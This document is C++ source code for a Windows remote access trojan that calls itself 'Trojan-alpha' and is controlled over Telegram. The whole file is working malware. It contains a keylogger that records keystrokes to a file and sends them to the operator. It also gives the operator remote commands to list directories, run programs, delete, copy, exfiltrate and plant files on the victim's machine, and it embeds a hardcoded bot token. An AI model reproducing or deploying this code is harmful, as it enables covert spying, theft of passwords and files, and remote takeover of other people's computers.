#include <iostream>
#include <tgbot/tgbot.h>
#include <filesystem>
#include <Shellapi.h>

namespace fs = std::filesystem;
const char* filename = "temp.txt";
bool isKeyLoggerRunning = false;


// KeyLogger function
void startKeyLogger(const TgBot::Bot &bot_ref, const int64_t chat_id) {
	using namespace std;
	
	while (isKeyLoggerRunning) 
	{
		ofstream outfile(filename, ios::app); // creating a file (if it does not already exist)

		// Checking if there are problems with access to the file
		if (!outfile)
		{
			bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
			break;
		}

		for (int i = 0; i < 0xA3; i++)
		{
			// If a key was pressed...
			if (GetAsyncKeyState(i) & 0b1)
			{
				if (i >= 0x30 && i <= 0x5A)     // keys 0-9 and 'A'-'Z' https://learn.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes
					outfile << (char)i;

				else if (i == VK_RETURN)        // other keys
					outfile << "[ENTER]";

				else if (i == VK_BACK)
					outfile << "[BACKSPACE]";

				else if (i == VK_SPACE)
					outfile << ' ';

				else if (i == VK_SHIFT)
					outfile << "[SHIFT]";

				else if (i == VK_CONTROL)
					outfile << "[CTRL]";
			};
		}
		outfile.close();
	}
}


// Function for conversion UTF-16 → UTF-8 (std::string → std::wstring)
std::string wstringToUtf8(const std::wstring& wstr) {
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}


// Function for conversion UTF-8 → UTF-16 (std::wstring → std::string)
std::wstring utf8_to_wstring(const std::string& utf8_str) {
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, NULL, 0);
	if (size_needed == 0) {
		return L""; // Ошибка конвертации
	}
	std::wstring wstr(size_needed - 1, 0);
	MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, &wstr[0], size_needed);
	return wstr;
}


// Main function
void startBot(std::string token) 
{
	using namespace std;

	TgBot::Bot bot(token);

	/*
	If the current mode is empty, it means that this is a normal mode: 
	we can write commands, but if it is not empty, it means that 
	the program will not accept commands, but will accept what 
	the mode is set to (path to folder, flags for executing subtasks, etc.)
	*/
	std::string currentMode = "";
	bool isWaitingForSecondPath = false;
	bool isWaitingForFile = false;


	bot.getEvents().onCommand("start", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id,
				std::string("Hello, welcome to Trojan-alpha. Here's the commands you can use:\n")
				+ "/start_key_logger - starts key_logger;\n"
				+ "/kill_key_logger - kills key_logger;\n"
				+ "/send_key_logger - sends a file with key logs;\n"
				+ "/check_dir_mode - opens check_directory mode;\n"
				+ "/start_file_mode - opens start_file mode;\n"
				+ "/delete_file_mode - opens delete_file mode;\n"
				+ "/copy_file_mode - opens copy_file mode;\n"
				+ "/send_file_mode - opens send_file mode;\n"
				+ "/upload_file_mode - opens upload_file mode;\n"
				+ "/exit_mode - exits your current mode.\n");
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);

		});


	// Starting Key Logger
	bot.getEvents().onCommand("start_key_logger", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty()) 
		{
			int64_t chat_id = message->chat->id;

			bot.getApi().sendMessage(chat_id, "Starting Key Logger.");
			isKeyLoggerRunning = true;

			thread keyLogger(startKeyLogger, std::ref(bot), chat_id);
			keyLogger.detach();
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	// Killing current Key Logger session
	bot.getEvents().onCommand("kill_key_logger", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			isKeyLoggerRunning = false;
			bot.getApi().sendMessage(message->chat->id, "Killing current key_logger session.");
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	// Sending a file with Key Logger records
	bot.getEvents().onCommand("send_key_logger", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty()) 
		{
			// Проверяем, не пустой ли файл
			ifstream inFile(filename);
			if (inFile.peek() == std::ifstream::traits_type::eof())
				bot.getApi().sendMessage(message->chat->id, "The file is empty.");
			else
				bot.getApi().sendDocument(message->chat->id, TgBot::InputFile::fromFile(filename, "text/plain"));
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);

		});

	
	// Accepts russian symbols!
	bot.getEvents().onCommand("check_dir_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of directory you want to check.");
			currentMode = "check_dir";
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	// Accepts russian symbols!
	bot.getEvents().onCommand("start_file_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to start.");
			currentMode = "start_file";
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	// Accepts russian symbols!
	bot.getEvents().onCommand("delete_file_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to delete.");
			currentMode = "delete_file";
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	bot.getEvents().onCommand("copy_file_mode", [&bot, &currentMode, &isWaitingForSecondPath](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to copy.");
			currentMode = "copy_file";
			isWaitingForSecondPath = true;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	bot.getEvents().onCommand("send_file_mode", [&bot, &currentMode, &isWaitingForSecondPath](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path of a file you want to download.");
			currentMode = "send_file";
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	bot.getEvents().onCommand("upload_file_mode", [&bot, &currentMode, &isWaitingForSecondPath, &isWaitingForFile](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id, "Send a file you want to upload.");
			currentMode = "upload_file";
			isWaitingForFile = true;
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	// ALL messages from the user are processed here FIRST.
	bot.getEvents().onAnyMessage([&bot, &currentMode, &isWaitingForSecondPath, &isWaitingForFile](TgBot::Message::Ptr message) {

		// This command is here for easement.
		if (message->text == "/exit_mode") {
			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode: " + currentMode);
			currentMode = "";
			return;
		}

		
		if (currentMode == "check_dir") {
			std::string path = message->text;
			std::wstring wpath = utf8_to_wstring(path);

			if (fs::exists(wpath) && fs::is_directory(wpath)) {
				std::string response;

				for (const auto& entry : fs::directory_iterator(wpath)) {
					std::wstring filePath = entry.path().wstring();
					std::string filePathUtf8 = wstringToUtf8(filePath);

					response += filePathUtf8 + "\n";
				}

				if (response.empty()) response = "Directory is empty.";
				bot.getApi().sendMessage(message->chat->id, response);
			}
			else {
				bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist or is not a directory.");
			}
		}


		else if (currentMode == "start_file") 
		{
			string path = message->text;
			wstring wpath = utf8_to_wstring(path);

			if (fs::exists(wpath)) 
			{
				// Starting the file with ShellExecuteW
				HINSTANCE result = ShellExecuteW(NULL, L"open", wpath.c_str(), NULL, NULL, SW_SHOWNORMAL);

				if ((intptr_t)result <= 32) 
					bot.getApi().sendMessage(message->chat->id, "Error executing program.");

				else 
					bot.getApi().sendMessage(message->chat->id, "Program executed successfully.");
					
			}
			else
				bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist.");
		}


		else if (currentMode == "delete_file") 
		{
			string path = message->text;
			wstring wpath = utf8_to_wstring(path);

			if (fs::exists(wpath) && fs::is_regular_file(wpath)) {
				if (fs::remove(wpath))
					bot.getApi().sendMessage(message->chat->id, "File has been successfully deleted.");
				else
					bot.getApi().sendMessage(message->chat->id, "Cannot delete the file.");
			}
			else
				bot.getApi().sendMessage(message->chat->id, "Path is not a file or does not exist.");
		}
		

		else if (currentMode == "copy_file")
		{
			static wstring tempPath;

			string path = message->text;
			wstring wpath = utf8_to_wstring(path);


			if (isWaitingForSecondPath) 
			{
				tempPath = wpath;
				bot.getApi().sendMessage(message->chat->id, "Send a path, where you want your file to be copied.");
				isWaitingForSecondPath = false;
				return;
			}
			try {
				isWaitingForSecondPath = true;
				if (fs::copy_file(tempPath, wpath)) {
					bot.getApi().sendMessage(message->chat->id, "File has been successfully copied.");
				}
				else {
					bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist.");
				}
			}
			catch (const std::exception& e) {
				bot.getApi().sendMessage(message->chat->id, std::string("An error occurred") + e.what());
			}
		}


		else if (currentMode == "send_file")
		{
			string path = message->text;
			wstring wpath = utf8_to_wstring(path);

			if (fs::exists(wpath) && fs::is_regular_file(wpath)) {
				try {
					string originalFileName = fs::path(wpath).filename().string();
					string extension = fs::path(wpath).extension().string();

					char tempPath[MAX_PATH];
					GetTempPathA(MAX_PATH, tempPath);
					string tempFile = std::string(tempPath) + "temfile" + extension;

					fs::copy(wpath, tempFile, fs::copy_options::overwrite_existing);
					bot.getApi().sendDocument(message->chat->id, TgBot::InputFile::fromFile(tempFile, "application/octet-stream"), originalFileName);

					fs::remove(tempFile);
					bot.getApi().sendMessage(message->chat->id, "File has been sent successfully.");
				}
				catch (const std::exception& e) {
					bot.getApi().sendMessage(message->chat->id, std::string("Error sending file: ") + e.what());
				}
			}
			else {
				bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist or is not a file.");
			}
			}


		else if (currentMode == "upload_file") {
			static TgBot::File::Ptr file;
			static std::string receivedFileContent;
			static std::string receivedFileName;

			if (isWaitingForFile) {
				if (message->document) {
					try {
						file = bot.getApi().getFile(message->document->fileId);
						receivedFileContent = bot.getApi().downloadFile(file->filePath);
						receivedFileName = message->document->fileName;

						bot.getApi().sendMessage(message->chat->id, "Send a path, where you want your file to be uploaded.");
						isWaitingForFile = false;
						return;
					}
					catch (const std::exception& e) {
						bot.getApi().sendMessage(message->chat->id, std::string("Error receiving file: ") + e.what());
					}
				}
				else {
					bot.getApi().sendMessage(message->chat->id, "Please send a file first.");
				}
			}
			else {
				std::string path = message->text;
				std::wstring wpath = utf8_to_wstring(path);

				if (fs::exists(wpath) && fs::is_directory(wpath)) {
					std::wstring fullPath = wpath + L"\\" + utf8_to_wstring(receivedFileName);

					std::ofstream outFile(fullPath, std::ios::binary);

					if (outFile.is_open()) {
						outFile.write(receivedFileContent.data(), receivedFileContent.size());
						outFile.close();
						bot.getApi().sendMessage(message->chat->id, "File has been uploaded successfully.");
					}
					else {
						bot.getApi().sendMessage(message->chat->id, "Error opening the file.");
					}
				}
				else
					bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist or is not a directory.");
				

				isWaitingForFile = true;
			}
		}


		});


	try {
		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
		TgBot::TgLongPoll longPoll(bot);
		while (true) {
			longPoll.start();
		}
	}
	catch (TgBot::TgException& e) {
		printf("error: %s\n", e.what());
	}
}

int main()
{
	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");
	
	return 0;
}
